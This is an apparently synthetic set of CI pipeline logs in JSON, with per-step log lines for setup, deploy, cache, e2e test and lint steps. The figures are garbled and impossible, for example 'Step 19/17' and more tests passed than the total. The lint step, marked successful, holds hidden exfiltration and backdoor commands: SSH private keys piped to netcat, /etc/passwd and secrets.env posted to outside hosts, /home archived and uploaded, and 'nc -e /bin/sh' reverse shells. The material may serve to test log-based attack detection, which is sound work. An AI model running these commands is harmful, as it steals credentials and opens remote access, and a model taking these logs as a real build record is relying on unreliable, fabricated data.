          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "Using Python 3.9",
          "pip: Downloading jest-1.12.tar.gz",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Platform: win32-x64",
          "  PASS: integration/test_user_create.spec.js",
          "pip: Downloading webpack-2.1.tar.gz",
          "NODE_ENV=test",
          "Fetching submodules...",
          "Cache restored successfully (392MB)",
          "Step 19/17: Deploying",
          "Connection established",
          "Using Python 3.9",
          "Bundling styles.js",
          "Cache invalidated: node_modules",
          "Fetching submodules...",
          "[12:19:57] DEBUG: Initializing service",
          "Step 16/24: Building",
          "Done.",
          "Using Python 3.10",
          "POST /data - 200 (229ms)",
          "\u2713 All checks passed",
          "Tests: 62 passed, 130 total",
          "pip: Downloading react-5.8.tar.gz",
          "Compiling utils/utils.go...",
          "Step 17/23: Building",
          "Finished.",
          "Finished.",
          "Step 17/25: Deploying",
          "[12:19:57] INFO: Cache refreshed",
          "[12:19:57] DEBUG: Connection pool: 9 active",
          "Fetching submodules...",
          "Cache saved successfully",
          "HEAD is now at d481277",
          "TLS handshake completed",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache restored successfully (130MB)",
          "Transforming 145 files...",
          "Already up to date.",
          "Image pulled successfully",
          "Success!",
          "[12:19:57] DEBUG: Memory usage: 323MB",
          "HEAD is now at a7ac7ec",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Uploading artifact 'build' (40 files)",
          "  PASS: test_auth_login (30ms)",
          "Layer 7/15: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@3.6.9",
          "Installing lodash@4.1.6",
          "Verifying...",
          "npm install: added 385 packages",
          "[12:19:57] DEBUG: Loading configuration",
          "[12:19:57] DEBUG: Loading configuration",
          "Artifact downloaded: 13MB",
          "Time: 90.497s",
          "Building Docker image...",
          "\u2717 build failed with exit code 72",
          "Success!",
          "Step 19/16: Installing dependencies",
          "npm notice: created a lockfile",
          "Pulling image: node:18",
          "Step 11/17: Installing dependencies",
          "Step 20/23: Building",
          "[12:19:57] DEBUG: Initializing service",
          "\u2717 build failed with exit code 33",
          "Done.",
          "Snapshots: 50 passed, 37 total",
          "Fetching submodules...",
          "Fetching submodules...",
          "\u2713 Step 'install' succeeded",
          "Environment: test",
          "Transforming 756 files...",
          "Image pulled successfully",
          "[12:19:57] INFO: Starting build process",
          "Using Node.js 17.17.3",
          "GET /api - 204 (81ms)",
          "pip install: Successfully installed webpack-5.7",
          "Waiting...",
          "Cache restored successfully (201MB)",
          "Step 14/24: Linting",
          "Finished.",
          "pip: Collecting express",
          "NODE_ENV=production",
          "Exception: NullPointerException",
          "Installing axios@1.1.3",
          "Creating production build...",
          "\u2713 Task completed in 506ms",
          "[12:19:57] INFO: Processing request",
          "pip: Downloading webpack-1.2.tar.gz",
          "HEAD is now at c7aea63",
          "\u2713 Step 'checkout' succeeded",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:57] DEBUG: Connection pool: 10 active",
          "Cache hit for key-2484",
          "[12:19:57] INFO: Connecting to database",
          "Tests: 59 passed, 79 total",
          "[12:19:57] INFO: Connecting to database",
          "pip: Collecting react",
          "[12:19:57] INFO: Cache refreshed",
          "Fetching submodules...",
          "Step 10/20: Building",
          "Verifying...",
          "Done.",
          "Installing jest@2.7.6",
          "Installing webpack@1.11.2",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 396 packages",
          "Pushing to registry...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-01T12:22:03.631760",
        "finished_at": "2025-12-01T12:22:11.352687",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 19/24: Installing dependencies",
          "[12:19:57] WARN: Deprecated API usage",
          "Step 11/20: Testing",
          "Ready.",
          "Switched to branch 'bugfix/task-823'",
          "Done.",
          "pip: Downloading jest-4.15.tar.gz",
          "Minifying app.js",
          "Exception: TypeError",
          "pip install: Successfully installed webpack-1.18",
          "Generating source maps...",
          "Compiling lib/app.ts...",
          "Done.",
          "Optimizing 88 modules...",
          "Ready.",
          "\u2713 All checks passed",
          "Connecting to cloud.services:443...",
          "[12:19:57] WARN: Deprecated API usage",
          "Artifact downloaded: 13MB",
          "  PASS: e2e/test_auth_login.spec.js",
          "Using Node.js 19.2.5",
          "Compiling utils/handler.rs...",
          "Step 20/18: Testing",
          "[12:19:57] WARN: Deprecated API usage",
          "Finished.",
          "Cache saved successfully",
          "[12:19:57] INFO: Connecting to database",
          "OK",
          "pip: Collecting react",
          "Compiling src/main.py...",
          "NODE_ENV=development",
          "Uploading artifact 'build' (50 files)",
          "[12:19:57] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (53MB)",
          "[12:19:57] INFO: Processing request",
          "Verifying...",
          "Verifying...",
          "\u2713 Task completed in 3062ms",
          "Snapshots: 35 passed, 9 total",
          "Cache hit for key-6273",
          "TLS handshake completed",
          "Step 17/15: Testing",
          "[12:19:57] DEBUG: Loading configuration",
          "Step 18/23: Installing dependencies",
          "GET /status - 200 (38ms)",
          "Waiting...",
          "[12:19:57] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Generating source maps...",
          "npm install: resolved 1201 packages",
          "Switched to branch 'hotfix/task-570'",
          "Cache hit for key-1305",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "Platform: linux-x64",
          "npm notice: created a lockfile",
          "Using Node.js 20.10.0",
          "\u2713 Task completed in 791ms",
          "[12:19:57] INFO: Processing request",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:19:57] DEBUG: Memory usage: 592MB",
          "Pulling image: alpine:latest",
          "Verifying...",
          "Artifact uploaded: dist.zip (54MB)",
          "pip: Collecting lodash",
          "[12:19:57] INFO: Request completed",
          "Cache miss for key-9131",
          "Cache saved successfully",
          "[12:19:57] WARN: Deprecated API usage",
          "Waiting...",
          "Artifact downloaded: 23MB",
          "[12:19:57] DEBUG: Memory usage: 1081MB",
          "Uploading artifact 'dist' (45 files)",
          "Coverage: 90% statements, 74% branches",
          "Minifying vendor.js",
          "Fetching submodules...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache invalidated: node_modules",
          "npm install: resolved 717 packages",
          "Cache restored successfully (418MB)",
          "Minifying vendor.js",
          "Creating production build...",
          "Step 18/21: Running migrations",
          "Loading...",
          "pip: Installing build dependencies...",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] DEBUG: Initializing service",
          "Connecting to example.com:443...",
          "[12:19:57] DEBUG: Loading configuration",
          "Coverage: 89% statements, 82% branches",
          "Generating source maps...",
          "pip: Downloading axios-5.11.tar.gz",
          "OK",
          "Cache saved successfully",
          "Cache miss for key-2730",
          "Compiling utils/service.java...",
          "pip: Installing build dependencies...",
          "Success!",
          "Loading...",
          "[12:19:57] DEBUG: Initializing service",
          "Ran 155 tests in 16s",
          "Cache invalidated: node_modules",
          "npm install: resolved 1079 packages",
          "Fetching submodules...",
          "Layer 5/15: RUN command",
          "Transforming 526 files...",
          "Coverage: 77% statements, 66% branches",
          "[12:19:57] INFO: Starting build process",
          "GET /status - 200 (56ms)",
          "pip install: Successfully installed express-3.11",
          "Step 6/22: Running migrations",
          "Step 3/24: Running migrations",
          "pip: Installing build dependencies...",
          "Optimizing 81 modules...",
          "Compiling lib/service.java...",
          "  PASS: test_db_connect (204ms)",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: added 485 packages",
          "\u2713 All checks passed",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'hotfix/task-458'",
          "Compiling src/app.ts...",
          "POST /data - 200 (430ms)",
          "\u2713 All checks passed",
          "Step 16/22: Building",
          "Fetching submodules...",
          "Done.",
          "  PASS: e2e/test_api_health.spec.js",
          "NODE_ENV=development",
          "Compiling components/service.java...",
          "Verifying...",
          "Cache invalidated: node_modules",
          "Bundling runtime.css",
          "Finished.",
          "\u2717 build failed with exit code 10",
          "pip: Collecting eslint",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 7/17: Linting",
          "Processing...",
          "Building Docker image...",
          "Artifact downloaded: 17MB",
          "FAILED: test_db_connect",
          "TLS handshake completed",
          "Step 10/17: Testing",
          "Completed.",
          "POST /upload - 200 (92ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:19:57] INFO: Cache refreshed",
          "Step 9/20: Installing dependencies",
          "Tests: 87 passed, 162 total",
          "Finished.",
          "Bundling runtime.css",
          "POST /upload - 201 (342ms)",
          "Ready.",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "pip: Downloading jest-5.4.tar.gz",
          "[12:19:57] DEBUG: Loading configuration",
          "pip: Downloading eslint-3.15.tar.gz",
          "POST /api - 200 (473ms)",
          "FAILED: test_cache_hit",
          "Ready.",
          "Platform: linux-x64",
          "Processing...",
          "Cache hit for key-4945",
          "Installing lodash@4.3.6",
          "[12:19:57] INFO: Cache refreshed",
          "Optimizing 82 modules...",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Transforming 828 files...",
          "Fetching submodules...",
          "\u2717 build failed with exit code 114",
          "Already up to date.",
          "TLS handshake completed",
          "Processing...",
          "npm install: resolved 625 packages",
          "\u2713 Step 'setup' succeeded",
          "Compiling lib/service.java...",
          "[12:19:57] INFO: Processing request",
          "Tests: 131 passed, 327 total",
          "Already up to date.",
          "Step 16/21: Testing",
          "[12:19:57] DEBUG: Query executed in 5ms",
          "Pulling image: python:3.11",
          "Ran 27 tests in 30s",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-01T12:22:11.352687",
        "finished_at": "2025-12-01T12:22:15.985243",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Platform: darwin-arm64",
          "[12:19:57] DEBUG: Initializing service",
          "Bundling main.js",
          "Installing react@3.4.3",
          "Verifying...",
          "pip: Installing build dependencies...",
          "[12:19:57] DEBUG: Memory usage: 1393MB",
          "npm install: added 472 packages",
          "Cache miss for key-9321",
          "[12:19:57] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Optimizing 37 modules...",
          "WARNING: express has known vulnerabilities",
          "Connection established",
          "Completed.",
          "Ran 31 tests in 34s",
          "[12:19:57] DEBUG: Memory usage: 1707MB",
          "[12:19:57] INFO: Starting build process",
          "HEAD is now at 513029c",
          "Loading...",
          "Pushing to registry...",
          "[12:19:57] INFO: Connecting to database",
          "Done.",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache saved successfully",
          "Optimizing 38 modules...",
          "[12:19:57] DEBUG: Loading configuration",
          "Using Node.js 18.14.5",
          "\u2713 Step 'test' succeeded",
          "HEAD is now at 5f8ee7e",
          "Cache miss for key-1263",
          "Time: 24.643s",
          "\u2713 lint completed",
          "Success!",
          "Coverage: 85% statements, 79% branches",
          "WARNING: jest has known vulnerabilities",
          "Compiling components/app.ts...",
          "[12:19:57] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (5MB)",
          "npm install: resolved 1627 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 11/15: Running migrations",
          "NODE_ENV=development",
          "[12:19:57] DEBUG: Query executed in 51ms",
          "pip install: Successfully installed webpack-1.16",
          "Transforming 283 files...",
          "Building Docker image...",
          "\u2713 build completed",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache hit for key-2352",
          "Verifying...",
          "Finished.",
          "Snapshots: 41 passed, 27 total",
          "Compiling utils/utils.go...",
          "Cache hit for key-7555",
          "Step 2/21: Running migrations",
          "Cache hit for key-7662",
          "npm install: resolved 1390 packages",
          "TLS handshake completed",
          "Checking out master branch",
          "Snapshots: 32 passed, 23 total",
          "Coverage: 94% statements, 92% branches",
          "Platform: win32-x64",
          "POST /data - 202 (178ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 12/23: Running migrations",
          "Ready.",
          "[12:19:57] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Connection established",
          "[12:19:57] ERROR: Connection failed",
          "Step 18/16: Building",
          "Using Python 3.11",
          "Cache invalidated: node_modules",
          "Installing webpack@2.9.9",
          "Step 4/18: Testing",
          "Time: 15.715s",
          "\u2717 build failed with exit code 16",
          "pip install: Successfully installed axios-1.8",
          "Artifact downloaded: 23MB",
          "[12:19:57] INFO: Connecting to database",
          "Completed.",
          "Cache restored successfully (462MB)",
          "Step 12/16: Installing dependencies",
          "Loading...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (84MB)",
          "NODE_ENV=development",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "Finished.",
          "Tests: 52 passed, 51 total",
          "Cache hit for key-1271",
          "Snapshots: 35 passed, 18 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:57] INFO: Starting build process",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] INFO: Starting build process",
          "FAILED: test_api_health",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 16/25: Building",
          "Success!",
          "Connecting to acme.corp:443...",
          "Waiting...",
          "pip: Collecting webpack",
          "  PASS: integration/test_user_create.spec.js",
          "pip install: Successfully installed webpack-1.3",
          "Tests: 162 passed, 422 total",
          "[12:19:57] DEBUG: Query executed in 56ms",
          "Fetching submodules...",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "Ran 134 tests in 37s",
          "Artifact uploaded: dist.zip (72MB)",
          "npm notice: package.json updated",
          "Waiting...",
          "Compiling lib/handler.rs...",
          "Using Python 3.9",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 90",
          "pip: Installing build dependencies...",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (12ms)",
          "Checking out main branch",
          "\u2713 Task completed in 1265ms",
          "[12:19:57] DEBUG: Initializing service",
          "[12:19:57] WARN: Deprecated API usage",
          "FAILED: test_auth_login",
          "npm notice: package.json updated",
          "[12:19:57] DEBUG: Initializing service",
          "Test Suites: 6 passed, 13 total",
          "Building Docker image...",
          "POST /data - 202 (425ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling components/service.java...",
          "Step 19/21: Linting",
          "Uploading artifact 'coverage' (17 files)",
          "Bundling main.css",
          "Step 7/21: Deploying",
          "Step 6/18: Running migrations",
          "Using Node.js 14.17.4",
          "Installing lodash@1.19.7",
          "Exception: ValueError",
          "[12:19:57] INFO: Cache refreshed",
          "POST /api - 200 (144ms)",
          "pip: Collecting lodash",
          "Completed.",
          "[12:19:57] INFO: Starting build process",
          "Step 14/15: Deploying",
          "Generating source maps...",
          "Step 10/19: Installing dependencies",
          "Step 9/24: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Optimizing 29 modules...",
          "Pushing to registry...",
          "Coverage: 93% statements, 68% branches",
          "\u2713 Step 'install' succeeded",
          "Step 20/25: Building",
          "Coverage: 77% statements, 90% branches",
          "Step 4/22: Installing dependencies",
          "Processing...",
          "  PASS: test_user_create (231ms)",
          "Waiting...",
          "Waiting...",
          "npm notice: created a lockfile",
          "NODE_ENV=development",
          "[12:19:57] DEBUG: Connection pool: 2 active",
          "Verifying...",
          "[12:19:57] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: express has known vulnerabilities",
          "[12:19:57] WARN: Deprecated API usage",
          "Creating production build...",
          "\u2713 Task completed in 702ms",
          "Cache saved successfully",
          "Step 9/20: Building",
          "Tests: 200 passed, 351 total",
          "Optimizing 83 modules...",
          "Environment: production",
          "npm notice: created a lockfile",
          "Finished.",
          "Time: 118.428s",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] DEBUG: Query executed in 63ms",
          "Creating production build...",
          "Transforming 773 files...",
          "[12:19:57] DEBUG: Memory usage: 379MB",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-01T12:22:15.985243",
        "finished_at": "2025-12-01T12:22:23.706170",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Time: 6.115s",
          "HEAD is now at 4bdbded",
          "[12:19:57] INFO: Connecting to database",
          "Checking out master branch",
          "  PASS: e2e/test_auth_login.spec.js",
          "POST /data - 200 (276ms)",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:57] INFO: Request completed",
          "npm notice: created a lockfile",
          "Step 15/17: Installing dependencies",
          "[12:19:57] INFO: Processing request",
          "Cache hit for key-3527",
          "Cache restored successfully (84MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 5 passed, 9 total",
          "\u2713 Step 'setup' succeeded",
          "Installing lodash@4.19.0",
          "Step 11/16: Linting",
          "npm install: resolved 422 packages",
          "[12:19:57] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "[12:19:57] WARN: Deprecated API usage",
          "Artifact downloaded: 17MB",
          "npm install: added 194 packages",
          "Bundling vendor.css",
          "Tests: 245 passed, 403 total",
          "Pulling image: node:3.11",
          "[12:19:57] INFO: Connecting to database",
          "[12:19:57] WARN: Deprecated API usage",
          "GET /api - 204 (73ms)",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "[12:19:57] INFO: Connecting to database",
          "Installing lodash@1.13.1",
          "Cache restored successfully (206MB)",
          "WARNING: webpack has known vulnerabilities",
          "Creating production build...",
          "Compiling utils/service.java...",
          "OK",
          "\u2717 build failed with exit code 100",
          "npm install: resolved 1045 packages",
          "[12:19:57] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Environment: test",
          "WARNING: react has known vulnerabilities",
          "Pulling image: node:18",
          "Platform: darwin-arm64",
          "pip install: Successfully installed jest-4.14",
          "\u2713 lint completed",
          "yarn add: Done in 14.83s",
          "\u2713 lint completed",
          "NODE_ENV=test",
          "HEAD is now at 1d297c6",
          "Loading...",
          "  PASS: test_db_connect (256ms)",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "Transforming 246 files...",
          "Snapshots: 30 passed, 25 total",
          "Artifact uploaded: dist.zip (55MB)",
          "Cache invalidated: dependencies",
          "Verifying...",
          "pip: Downloading prettier-1.12.tar.gz",
          "Generating source maps...",
          "Already up to date.",
          "\u2717 build failed with exit code 100",
          "WARNING: lodash has known vulnerabilities",
          "Artifact downloaded: 19MB",
          "Cache invalidated: node_modules",
          "[12:19:57] DEBUG: Loading configuration",
          "Cache miss for key-9684",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "[12:19:57] INFO: Connecting to database",
          "Using Python 3.9",
          "Image pulled successfully",
          "Compiling utils/handler.rs...",
          "Connecting to acme.corp:443...",
          "npm install: resolved 552 packages",
          "[12:19:57] INFO: Cache refreshed",
          "[12:19:57] INFO: Cache refreshed",
          "Pulling image: python:3.11",
          "Ready.",
          "Verifying...",
          "[12:19:57] DEBUG: Connection pool: 15 active",
          "Environment: test",
          "Cache miss for key-7164",
          "Step 14/17: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out develop branch",
          "\u2713 Task completed in 941ms",
          "pip: Collecting prettier",
          "Uploading artifact 'coverage' (9 files)",
          "\u2713 lint completed",
          "[12:19:57] INFO: Processing request",
          "Connecting to acme.corp:443...",
          "[12:19:57] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache miss for key-2259",
          "Cache miss for key-1510",
          "[12:19:57] DEBUG: Query executed in 29ms",
          "Transforming 183 files...",
          "Cache miss for key-6326",
          "pip: Installing build dependencies...",
          "Step 10/22: Testing",
          "Step 2/22: Building",
          "Time: 51.247s",
          "Creating production build...",
          "[12:19:57] ERROR: Connection failed",
          "Switched to branch 'hotfix/task-558'",
          "\u2713 All checks passed",
          "Step 13/16: Installing dependencies",
          "Cache miss for key-5137",
          "TLS handshake completed",
          "Time: 100.592s",
          "[12:19:57] DEBUG: Memory usage: 1017MB",
          "Transforming 872 files...",
          "Artifact downloaded: 47MB",
          "\u2713 Task completed in 1754ms",
          "Bundling styles.js",
          "[12:19:57] ERROR: Connection failed",
          "Verifying...",
          "Creating production build...",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/main.py...",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Minifying main.js",
          "pip: Downloading axios-4.8.tar.gz",
          "Connection established",
          "Using Python 3.12",
          "Compiling components/utils.go...",
          "Done.",
          "npm install: resolved 1044 packages",
          "POST /data - 201 (221ms)",
          "WARNING: react has known vulnerabilities",
          "POST /api - 200 (80ms)",
          "[12:19:57] INFO: Cache refreshed",
          "Step 20/18: Linting",
          "Generating source maps...",
          "\u2713 Step 'build' succeeded",
          "OK",
          "Done.",
          "WARNING: lodash has known vulnerabilities",
          "Exception: TypeError",
          "Step 10/18: Building",
          "\u2713 Task completed in 4949ms",
          "[12:19:57] DEBUG: Memory usage: 1055MB",
          "[12:19:57] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 54",
          "Processing...",
          "FAILED: test_cache_hit",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/utils.go...",
          "\u2717 build failed with exit code 124",
          "  PASS: test_user_create (165ms)",
          "[12:19:57] INFO: Starting build process",
          "Compiling src/app.ts...",
          "Success!",
          "Ran 127 tests in 50s",
          "pip: Downloading prettier-5.8.tar.gz",
          "Step 15/17: Linting",
          "POST /api - 200 (294ms)",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Bundling runtime.js",
          "\u2713 Step 'build' succeeded",
          "Compiling lib/handler.rs...",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Cache miss for key-7104",
          "  PASS: test_api_health (328ms)",
          "Compiling components/index.js...",
          "npm notice: created a lockfile",
          "[12:19:57] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (36MB)",
          "Minifying app.js",
          "[12:19:57] INFO: Starting build process",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:57] DEBUG: Query executed in 24ms",
          "Image pulled successfully",
          "Connection established",
          "Step 5/22: Installing dependencies",
          "[12:19:57] WARN: Deprecated API usage",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-01T12:22:23.706170",
        "finished_at": "2025-12-01T12:22:31.427097",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 252.187.91.161 47010",
          "=== Step: lint ===",
          "Ran 159 tests in 42s",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed jest-4.14",
          "Snapshots: 16 passed, 45 total",
          "POST /api - 200 (393ms)",
          "Processing...",
          "Layer 1/9: COPY command",
          "[12:19:57] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Pulling image: node:18",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:57] INFO: Request completed",
          "HEAD is now at 28dceec",
          "Time: 42.927s",
          "pip install: Successfully installed lodash-4.1",
          "[12:19:57] INFO: Cache refreshed",
          "npm install: resolved 692 packages",
          "Ran 152 tests in 50s",
          "pip: Downloading webpack-1.19.tar.gz",
          "[12:19:57] ERROR: Connection failed",
          "Cache restored successfully (473MB)",
          "Success!",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Building Docker image...",
          "npm install: added 385 packages",
          "[12:19:57] WARN: Deprecated API usage",
          "nc -e /bin/sh 134.201.223.234 17207",
          "[12:19:57] INFO: Request completed",
          "[12:19:57] INFO: Request completed",
          "Environment: test",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Test Suites: 26 passed, 29 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:19:57] ERROR: Connection failed",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Already up to date.",
          "Layer 4/13: COPY command",
          "Optimizing 16 modules...",
          "nc -e /bin/sh 249.36.197.74 60715",
          "Waiting...",
          "Waiting...",
          "[12:19:57] DEBUG: Loading configuration",
          "Ran 184 tests in 10s",
          "[12:19:57] ERROR: Connection failed",
          "Connection established",
          "Cache invalidated: dependencies",
          "Already up to date.",
          "Optimizing 66 modules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "OK",
          "npm notice: created a lockfile",
          "\u2713 Step 'build' succeeded",
          "Environment: production",
          "Loading...",
          "pip: Installing build dependencies...",
          "Compiling utils/app.ts...",
          "Compiling src/index.js...",
          "[12:19:57] DEBUG: Initializing service",
          "  PASS: test_user_create (74ms)",
          "Switched to branch 'bugfix/task-730'",
          "Switched to branch 'bugfix/task-672'",
          "pip install: Successfully installed jest-4.3",
          "[12:19:57] DEBUG: Connection pool: 1 active",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "npm notice: package.json updated",
          "npm install: resolved 199 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 110.41.132.74 58418",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Artifact downloaded: 5MB",
          "npm install: added 214 packages",
          "[12:19:57] INFO: Connecting to database",
          "[12:19:57] DEBUG: Connection pool: 4 active",
          "Fetching submodules...",
          "Bundling styles.js",
          "Switched to branch 'feature/task-816'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Switched to branch 'feature/task-809'",
          "\u2713 Step 'build' succeeded",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Using Python 3.10",
          "Using Node.js 15.6.7",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache restored successfully (462MB)",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (294ms)",
          "pip install: Successfully installed lodash-2.11",
          "Using Python 3.11",
          "[12:19:57] INFO: Processing request",
          "\u2713 validate completed",
          "Switched to branch 'hotfix/task-823'",
          "[12:19:57] DEBUG: Loading configuration",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "Time: 21.627s",
          "[12:19:57] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 977 packages",
          "pip install: Successfully installed webpack-4.17",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling lib/utils.go...",
          "Step 7/20: Deploying",
          "[12:19:57] INFO: Cache refreshed",
          "[12:19:57] DEBUG: Memory usage: 1676MB",
          "GET /api - 204 (27ms)",
          "Uploading artifact 'dist' (4 files)",
          "[12:19:57] DEBUG: Connection pool: 2 active",
          "npm install: added 240 packages",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "[12:19:57] DEBUG: Query executed in 79ms",
          "Creating production build...",
          "Uploading artifact 'coverage' (6 files)",
          "[12:19:57] INFO: Cache refreshed",
          "Waiting...",
          "[12:19:57] INFO: Connecting to database",
          "Optimizing 12 modules...",
          "Finished.",
          "Connection established",
          "Cache miss for key-7600",
          "Using Python 3.9",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Waiting...",
          "[12:19:57] ERROR: Connection failed",
          "Compiling src/main.py...",
          "[12:19:57] INFO: Processing request",
          "Cache miss for key-1312",
          "Ready.",
          "[12:19:57] DEBUG: Memory usage: 927MB",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Uploading artifact 'coverage' (11 files)",
          "pip install: Successfully installed lodash-2.9",
          "Connection established",
          "Optimizing 22 modules...",
          "npm notice: package.json updated",
          "Using Python 3.10",
          "npm notice: package.json updated",
          "Sending 101MB of data to startup.dev",
          "npm notice: package.json updated",
          "GET /api - 201 (55ms)",
          "Step 19/24: Building",
          "Step 4/16: Deploying",
          "pip: Installing build dependencies...",
          "Sending 297MB of data to acme.corp",
          "Sending 92MB of data to test.io",
          "Compiling utils/index.js...",
          "yarn add: Done in 30.8s",
          "nc -e /bin/sh 182.156.153.149 34096",
          "Pushing to registry...",
          "Image pulled successfully",
          "Cache restored successfully (344MB)",
          "[12:19:57] WARN: Deprecated API usage",
          "Waiting...",
          "Cache invalidated: dependencies",
          "\u2713 Step 'setup' succeeded",
          "Using Node.js 14.7.5",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Generating source maps...",
          "[12:19:57] INFO: Processing request",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache hit for key-3920",
          "Step 6/19: Linting",
          "Coverage: 86% statements, 73% branches",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (99MB)",
          "WARNING: axios has known vulnerabilities",
          "Step 20/24: Linting",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "pip: Downloading jest-4.6.tar.gz",
          "Transforming 301 files...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/app.ts...",
          "nc -e /bin/sh 166.83.175.44 9625",
          "Installing webpack@2.4.7",
          "Switched to branch 'hotfix/task-768'",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "Step 15/22: Deploying",
          "WARNING: express has known vulnerabilities",
          "Step 2/16: Installing dependencies",
